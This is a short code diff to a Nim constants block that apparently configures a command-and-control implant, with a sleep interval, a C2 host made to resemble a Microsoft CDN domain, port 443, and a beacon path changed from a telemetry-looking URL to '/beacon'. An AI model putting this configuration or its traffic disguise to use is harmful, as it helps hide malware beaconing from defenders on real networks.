@@ -14,7 +14,7 @@ const
   SLEEP_MS*:      uint32 = 30_000'u32
   C2_HOST*:       string = "update.microsoft-cdn.net"
   C2_PORT*:       uint16 = 443'u16
-  C2_BEACON_PATH*: string = "/telemetry/v2/collect"
+  C2_BEACON_PATH*: string = "/beacon"
   TIMEOUT*:       uint32 = 10_000'u32
 
 # Operator-patched at build time by builder.py
